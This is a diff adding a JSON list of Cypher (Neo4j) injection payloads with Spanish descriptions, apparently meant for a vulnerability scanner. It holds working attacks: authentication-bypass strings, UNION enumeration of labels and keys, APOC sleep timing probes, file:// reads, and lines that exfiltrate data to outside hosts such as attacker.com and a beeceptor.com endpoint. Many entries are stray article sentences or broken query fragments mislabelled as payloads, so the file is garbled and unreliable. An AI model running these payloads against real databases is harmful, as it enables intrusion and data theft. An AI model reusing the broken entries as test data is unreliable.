@@ -1,0 +1,578 @@
+[
+  {
+    "id": "cypher-id-001",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "executeQuery (\"MATCH (c:Character) WHERE c.name = '\"  + name + \"' RETURN c\" )"
+  },
+  {
+    "id": "cypher-id-002",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "Spongebob ' or 1=1 RETURN c//"
+  },
+  {
+    "id": "cypher-id-003",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "executeQuery (\"MATCH (c:Character) WHERE c.name = 'Spongebob' or 1=1 RETURN"
+  },
+  {
+    "id": "cypher-id-004",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "c//' RETURN c\" )"
+  },
+  {
+    "id": "cypher-id-005",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "MATCH (c:Character )"
+  },
+  {
+    "id": "cypher-id-006",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "WHERE c.name = 'Spongebob'  or 1=1 RETURN  c//' RETURN c"
+  },
+  {
+    "id": "cypher-id-007",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "returning all nodes."
+  },
+  {
+    "id": "cypher-id-008",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "Example: In -band injection with UNION"
+  },
+  {
+    "id": "cypher-id-009",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "MATCH (a:Person)"
+  },
+  {
+    "id": "cypher-id-010",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "RETURN  a"
+  },
+  {
+    "id": "cypher-id-011",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "RETURN  1 AS a"
+  },
+  {
+    "id": "cypher-id-012",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "Note that the first query returns a Number while the second one returns a String,"
+  },
+  {
+    "id": "cypher-id-013",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "42 RETURN  1 AS a UNION MATCH(b)  RETURN  DISTINCT  labels(b) AS a //"
+  },
+  {
+    "id": "cypher-id-014",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "UNION MATCH(b)"
+  },
+  {
+    "id": "cypher-id-015",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "RETURN  DISTINCT  labels(b) AS a"
+  },
+  {
+    "id": "cypher-id-016",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "//RETURN a"
+  },
+  {
+    "id": "cypher-id-017",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "MATCH (p:Person)"
+  },
+  {
+    "id": "cypher-id-018",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "RETURN  p"
+  },
+  {
+    "id": "cypher-id-019",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "CALL db.labels() YIELD label"
+  },
+  {
+    "id": "cypher-id-020",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "'"
+  },
+  {
+    "id": "cypher-id-021",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "\""
+  },
+  {
+    "id": "cypher-id-022",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "\\'"
+  },
+  {
+    "id": "cypher-id-023",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "1 or 1=1"
+  },
+  {
+    "id": "cypher-id-024",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "' or 1=1"
+  },
+  {
+    "id": "cypher-id-025",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "\" or 1=1"
+  },
+  {
+    "id": "cypher-id-026",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "' or '1'='1"
+  },
+  {
+    "id": "cypher-id-027",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "\" or \"1\"=\"1"
+  },
+  {
+    "id": "cypher-id-028",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "' or 1=1 //"
+  },
+  {
+    "id": "cypher-id-029",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "' or 1=0 //"
+  },
+  {
+    "id": "cypher-id-030",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "\" or \"1\"=\"2"
+  },
+  {
+    "id": "cypher-id-031",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "\" or True //"
+  },
+  {
+    "id": "cypher-id-032",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "\" or False //"
+  },
+  {
+    "id": "cypher-id-033",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "Use this if APOC is enabled:"
+  },
+  {
+    "id": "cypher-id-034",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "CALL apoc.util.sleep( 10000)"
+  },
+  {
+    "id": "cypher-id-035",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "MATCH (n:User) WHERE n.name= 'Jane' RETURN  n"
+  },
+  {
+    "id": "cypher-id-036",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "apoc.util.sleep( 10000) RETURN  1 //"
+  },
+  {
+    "id": "cypher-id-037",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "1 OR 1=1"
+  },
+  {
+    "id": "cypher-id-038",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "MATCH (n) WHERE n.name = \"admin\" and n.password = {USER SUPPLIED INPUT}"
+  },
+  {
+    "id": "cypher-id-039",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "RETURN  n LIMIT 0"
+  },
+  {
+    "id": "cypher-id-040",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "MATCH (n) WHERE n.name = \"admin\" and n.password = 1 OR 1=1 RETURN  n LIMIT 0"
+  },
+  {
+    "id": "cypher-id-041",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "To build valid queries, we need to know which labels and properties exist in the"
+  },
+  {
+    "id": "cypher-id-042",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "database. So, the first thing to try is extracting this information and, if it’s not returned"
+  },
+  {
+    "id": "cypher-id-043",
+    "description": "Prueba para detectar vulnerabilidad Cypher Injection",
+    "severity": "medium",
+    "payload": "CALL db.labels()"
+  },
+  {
+    "id": "cypher-id-044",
+    "description": "Enumeración de claves del nodo Character.",
+    "severity": "low",
+    "payload": "MATCH (c:Character ) RETURN DISTINCT keys(c)"
+  },
+  {
+    "id": "cypher-id-045",
+    "description": "Lectura del nombre del nodo Character.",
+    "severity": "low",
+    "payload": "MATCH (c:Character ) RETURN c.name"
+  },
+  {
+    "id": "cypher-id-046",
+    "description": "Prueba de SSRF interno para filtración de datos.",
+    "severity": "low",
+    "payload": "leaking data from the database to a server we control"
+  },
+  {
+    "id": "cypher-id-047",
+    "description": "Retorno arbitrario usando alias b.",
+    "severity": "low",
+    "payload": "AS b RETURN b//"
+  },
+  {
+    "id": "cypher-id-048",
+    "description": "Fuga de propiedades de un label usando APOC.",
+    "severity": "low",
+    "payload": "Leak properties of a label using APOC"
+  },
+  {
+    "id": "cypher-id-049",
+    "description": "Fuga de propiedades sin APOC.",
+    "severity": "low",
+    "payload": "Leak properties of a label without APOC"
+  },
+  {
+    "id": "cypher-id-050",
+    "description": "Prueba basada en mensajes de error sobre variables internas.",
+    "severity": "low",
+    "payload": "Even if you couldn’t leak labels and properties..."
+  },
+  {
+    "id": "cypher-id-051",
+    "description": "Prueba basada en mensajes de error para deducir variables.",
+    "severity": "low",
+    "payload": "error message that tells you the name of the return variable"
+  },
+  {
+    "id": "cypher-id-052",
+    "description": "Inyección reemplazando variable de retorno.",
+    "severity": "low",
+    "payload": "// Replace 'c' with the return variable's name"
+  },
+  {
+    "id": "cypher-id-053",
+    "description": "Boolean-based injection OR 1=1.",
+    "severity": "low",
+    "payload": "' or 1=1 RETURN c//"
+  },
+  {
+    "id": "cypher-id-054",
+    "description": "Boolean-based injection OR 1=1 en WHERE.",
+    "severity": "low",
+    "payload": "WHERE c.name = '' or 1=1"
+  },
+  {
+    "id": "cypher-id-055",
+    "description": "Retorno de variable manipulada.",
+    "severity": "low",
+    "payload": "RETURN c//' RETURN c"
+  },
+  {
+    "id": "cypher-id-056",
+    "description": "Consulta básica MATCH para enumeración.",
+    "severity": "low",
+    "payload": "MATCH (a:Movie)"
+  },
+  {
+    "id": "cypher-id-057",
+    "description": "Enumeración con ORDER BY y Date().",
+    "severity": "low",
+    "payload": "RETURN a ORDER BY a.title,Date(keys(a))"
+  },
+  {
+    "id": "cypher-id-058",
+    "description": "Enumeración de claves con size().",
+    "severity": "low",
+    "payload": "RETURN size(keys(a))"
+  },
+  {
+    "id": "cypher-id-059",
+    "description": "Prueba OR comparando size().",
+    "severity": "low",
+    "payload": "WHERE a.name = '' OR 4 = size('1234')"
+  },
+  {
+    "id": "cypher-id-060",
+    "description": "Explicación de cómo size() hace la condición verdadera.",
+    "severity": "low",
+    "payload": "OR 4 = size('1234') makes the condition true"
+  },
+  {
+    "id": "cypher-id-061",
+    "description": "Uso alternado del comparador size().",
+    "severity": "low",
+    "payload": "Replacing 4 = size('1234') with 1 = size('1234')"
+  },
+  {
+    "id": "cypher-id-062",
+    "description": "Lectura de longitud de claves individuales.",
+    "severity": "low",
+    "payload": "RETURN size(keys(a)[0])"
+  },
+  {
+    "id": "cypher-id-063",
+    "description": "Payload simple para probar inyección en título.",
+    "severity": "low",
+    "payload": "MATCH (a) WHERE a.title = 'injected' RETURN 1 AS test"
+  },
+  {
+    "id": "cypher-id-064",
+    "description": "Uso de UNION para identificar inyección.",
+    "severity": "low",
+    "payload": "UNION"
+  },
+  {
+    "id": "cypher-id-065",
+    "description": "Enumeración de claves iniciales de Person.",
+    "severity": "low",
+    "payload": "RETURN substring (keys(b)[0],0,1) AS test//"
+  },
+  {
+    "id": "cypher-id-066",
+    "description": "MATCH básico para enumeración de nodos Person.",
+    "severity": "low",
+    "payload": "MATCH (b:Person) RETURN"
+  },
+  {
+    "id": "cypher-id-067",
+    "description": "UNION + enumeración de Person.",
+    "severity": "low",
+    "payload": "MATCH (a) WHERE a.title = 'injected' RETURN 1 AS test UNION MATCH (b:Person)"
+  },
+  {
+    "id": "cypher-id-068",
+    "description": "Case comparison con substring para detección.",
+    "severity": "low",
+    "payload": "RETURN case substring (keys(b)[0],0,1) WHEN \"n\" THEN 2 ELSE 3 END AS test//"
+  },
+  {
+    "id": "cypher-id-069",
+    "description": "MATCH genérico para detección.",
+    "severity": "low",
+    "payload": "MATCH"
+  },
+  {
+    "id": "cypher-id-070",
+    "description": "Retorno del nodo Person.",
+    "severity": "low",
+    "payload": "(b:Person) RETURN"
+  },
+  {
+    "id": "cypher-id-071",
+    "description": "Inyección basada en tiempo usando APOC.",
+    "severity": "low",
+    "payload": "CALL apoc.util.sleep(10000)"
+  },
+  {
+    "id": "cypher-id-072",
+    "description": "SSRF interno por LOAD CSV.",
+    "severity": "low",
+    "payload": "Try loading internal web pages or files"
+  },
+  {
+    "id": "cypher-id-073",
+    "description": "Retorno vacío para análisis de comportamiento.",
+    "severity": "low",
+    "payload": "RETURN ''//"
+  },
+  {
+    "id": "cypher-id-074",
+    "description": "Fuga en entornos cloud mediante metadata service.",
+    "severity": "low",
+    "payload": "If you can query a cloud metadata service"
+  },
+  {
+    "id": "cypher-id-075",
+    "description": "Prueba de error por caracteres sin URL encoding.",
+    "severity": "low",
+    "payload": "E.g. running this query in Neo4j Browser returns an error"
+  },
+  {
+    "id": "cypher-id-076",
+    "description": "Retorno simple para validación.",
+    "severity": "low",
+    "payload": "RETURN y"
+  },
+  {
+    "id": "cypher-id-077",
+    "description": "Splitting a b c into a list and exfiltrating the first element.",
+    "severity": "low",
+    "payload": "LOAD CSV FROM 'https://challs2.free.beeceptor.com/' + split('a b c',' ')[0] AS y"
+  },
+  {
+    "id": "cypher-id-078",
+    "description": "Probar URL encoding para detectar posibilidad de inyección.",
+    "severity": "low",
+    "payload": "apoc.text.urlencode()"
+  },
+  {
+    "id": "cypher-id-079",
+    "description": "Detección sin usar APOC.",
+    "severity": "low",
+    "payload": "// no payload específico provisto en la tabla"
+  },
+  {
+    "id": "cypher-id-080",
+    "description": "Detección con LOAD CSV concatenado.",
+    "severity": "low",
+    "payload": "RETURN ''"
+  },
+  {
+    "id": "cypher-id-081",
+    "description": "Detección usando incremental iterator.",
+    "severity": "low",
+    "payload": "RETURN ''"
+  },
+  {
+    "id": "cypher-id-082",
+    "description": "Revisar ubicación de archivos internos usando LOAD CSV.",
+    "severity": "low",
+    "payload": "LOAD CSV FROM 'file://path'"
+  },
+  {
+    "id": "cypher-id-083",
+    "description": "Listar configuración del servidor import directories.",
+    "severity": "low",
+    "payload": "CALL dbms.listConfig() YIELD name, value WHERE name='server.directories.import' RETURN value"
+  },
+  {
+    "id": "cypher-id-084",
+    "description": "Detección para confirmar respuesta antes de exfiltración.",
+    "severity": "low",
+    "payload": "AS y RETURN ''//"
+  },
+  {
+    "id": "cypher-id-085",
+    "description": "Bypass de autenticación con OR booleano en MATCH.",
+    "severity": "low",
+    "payload": "MATCH (n) WHERE n.id='1' OR 1=1 RETURN n"
+  },
+  {
+    "id": "cypher-id-086",
+    "description": "Detección con RETURN n en UNION.",
+    "severity": "low",
+    "payload": "RETURN n"
+  },
+  {
+    "id": "cypher-id-087",
+    "description": "Blind boolean-based admin=True.",
+    "severity": "low",
+    "payload": ",n.admin=True RETURN n//"
+  },
+  {
+    "id": "cypher-id-088",
+    "description": "Detección con retorno directo.",
+    "severity": "low",
+    "payload": "//\" RETURN n"
+  },
+  {
+    "id": "cypher-id-089",
+    "description": "Payload educativo sobre riesgos (sin exfiltrar).",
+    "severity": "low",
+    "payload": "// Información conceptual"
+  },
+  {
+    "id": "cypher-id-090",
+    "description": "Listar conexiones abiertas en Neo4j.",
+    "severity": "low",
+    "payload": "CALL dbms.listConnections()"
+  },
+  {
+    "id": "cypher-id-091",
+    "description": "MATCH (all) para mapeo general del grafo.",
+    "severity": "low",
+    "payload": "MATCH (all)"
+  },
+  {
+    "id": "cypher-id-092",
+    "description": "MATCH (n) RETURN n para detección básica.",
+    "severity": "low",
+    "payload": "MATCH (n) RETURN n"
+  },
+  {
+    "id": "cypher-id-093",
+    "description": "Bypass con comentarios estilo /**/.",
+    "severity": "low",
+    "payload": "MATCH/**/(n)/**/RETURN /**/n"
+  },
+  {
+    "id": "cypher-id-094",
+    "description": "Detección con comentarios ofuscados.",
+    "severity": "low",
+    "payload": "MATCH/*socmb*/ (n)/*yaoekd*/ RETURN /*pxras*/ n"
+  },
+  {
+    "id": "cypher-id-095",
+    "description": "Uso de APOC load.json para confirmar lectura remota.",
+    "severity": "low",
+    "payload": "CALL apoc.load.json(\"https://attacker.com/data.json?leaked=\" + c.name)"
+  },
+  {
+    "id": "cypher-id-096",
+    "description": "Uso de YIELD value RETURN value para detección.",
+    "severity": "low",
+    "payload": "YIELD value RETURN value//"
+  }
+]
